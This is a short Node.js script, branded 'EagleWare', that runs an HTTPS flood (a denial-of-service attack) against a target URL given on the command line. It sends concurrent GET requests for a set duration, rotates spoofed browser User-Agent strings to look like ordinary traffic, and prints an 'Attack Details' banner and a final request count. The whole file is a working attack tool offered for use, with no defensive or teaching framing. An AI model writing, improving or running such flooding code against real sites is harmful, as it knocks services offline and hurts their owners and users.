const axios = require('axios');
const async = require('async');
const process = require('process');

// npm install axios

const [,, url, duration, concurrency] = process.argv;

const endtime = Date.now() + (duration ? duration * 1000 : 100000);
const userAgents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:91.0) Gecko/20100101 Firefox/91.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:90.0) Gecko/20100101 Firefox/90.0'
];

const printAttackDetails = () => {
    console.clear();
    const width = process.stdout.columns || 80; 
    console.log(' '.repeat((width - 30) / 2) + "EagleWare Attack Details");
    console.log(' '.repeat((width - 40) / 2) + "╔════════════════════════════════╗");
    console.log(' '.repeat((width - 40) / 2) + ` Target URL: ${url}`);
    console.log(' '.repeat((width - 40) / 2) + ` Duration: ${duration} seconds`);
    console.log(' '.repeat((width - 40) / 2) + ` Concurrency: ${concurrency}`);
    console.log(' '.repeat((width - 40) / 2) + ` Method: HTTPS Flood`);
    console.log(' '.repeat((width - 40) / 2) + "╚════════════════════════════════╝");
};

printAttackDetails();

let requestCount = 0;

const makeRequest = async () => {
    while (Date.now() <= endtime) {
        const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
        try {
            await axios.get(url, { headers: { 'User-Agent': userAgent } });
            requestCount++;
        } catch (error) {
            console.error('Error making request:', error.message);
        }
    }
};

async.timesLimit(concurrency, concurrency, async () => {
    await makeRequest();
}, (err) => {
    if (err) {
        console.error('Error sending packet:', err);
    }
    console.log(`Total requests sent: ${requestCount}`);
});
